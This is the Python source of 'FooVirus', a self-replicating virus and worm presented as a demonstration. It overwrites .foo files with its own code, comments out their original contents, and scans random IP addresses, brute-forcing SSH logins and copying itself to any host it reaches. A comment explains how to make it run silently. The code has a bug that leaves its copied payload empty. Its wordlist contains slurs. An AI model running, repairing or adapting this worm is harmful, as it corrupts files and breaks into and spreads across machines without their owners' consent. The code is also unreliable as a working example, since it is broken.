#!/usr/bin/env python
import sys
import os
import glob
import random
import paramiko
import scp
import select
import signal

##   FooVirus.py

##   You would want to uncomment the following two lines for the worm to
##   work silently:
# sys.stdout = open(os.devnull, 'w')
# sys.stderr = open(os.devnull, 'w')


def sig_handler(signum, frame):
    os.kill(os.getpid(), signal.SIGKILL)


signal.signal(signal.SIGINT, sig_handler)

debug = 1
NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = """bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk"""

digrams = """al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur"""

trigrams = trigrams.split()
digrams = digrams.split()


def get_new_usernames(how_many):
    if debug:
        return ["root"]
    if how_many == 0:
        return 0
    selector = "{0:03b}".format(random.randint(0, 7))
    usernames = [
        "".join(
            map(
                lambda x: random.sample(trigrams, 1)[0]
                if int(selector[x]) == 1
                else random.sample(digrams, 1)[0],
                range(3),
            )
        )
        for x in range(how_many)
    ]
    return usernames


def get_new_passwds(how_many):
    if debug:
        return ["mypassword"]
    if how_many == 0:
        return 0
    selector = "{0:03b}".format(random.randint(0, 7))
    passwds = [
        "".join(
            map(
                lambda x: random.sample(trigrams, 1)[0]
                + (str(random.randint(0, 9)) if random.random() > 0.5 else "")
                if int(selector[x]) == 1
                else random.sample(digrams, 1)[0],
                range(3),
            )
        )
        for x in range(how_many)
    ]
    return passwds


def get_fresh_ipaddresses(how_many):
    if debug:
        return ["172.17.0.2"]
    if how_many == 0:
        return 0
    ipaddresses = []
    for i in range(how_many):
        first, second, third, fourth = map(
            lambda x: str(1 + random.randint(0, x)), [223, 223, 223, 223]
        )
        ipaddresses.append(first + "." + second + "." + third + "." + fourth)
    return ipaddresses


print(
    """\nHELLO FROM FooVirus\n\n
This is a demonstration of how easy it is to write
a self-replicating program. This virus will infect
all files with names ending in .foo in the directory in
which you execute an infected file.  If you send an
infected file to someone else and they execute it, their,
foo files will be damaged also.

Note that this is a safe virus (for educational purposes
only) since it does not carry a harmful payload.  All it
does is to print out this message and comment out the
code in .foo files.\n\n"""
)

IN = open(sys.argv[0], "r")
line_count = len(IN.readlines())
virus = [line for (i, line) in enumerate(IN) if i < line_count]

for item in glob.glob("*.foo"):
    IN = open(item, "r")
    all_of_it = IN.readlines()
    IN.close()
    if any("foovirus" in line for line in all_of_it):
        continue
    os.chmod(item, 0o777)
    OUT = open(item, "w")
    OUT.writelines(virus)
    all_of_it = ["#" + line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()


while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)
    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print(
                    "\nTrying password %s for user %s at IP address: %s"
                    % (passwd, user, ip_address)
                )
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(
                        ip_address, port=22, username=user, password=passwd, timeout=5
                    )
                    print("\n\nconnected\n")
                    scpcon = scp.SCPClient(ssh.get_transport())
                    # Now deposit a copy of AbraWorm.py at the target host:
                    scpcon.put(sys.argv[0])
                    scpcon.close()
                except:
                    continue
    if debug:
        break
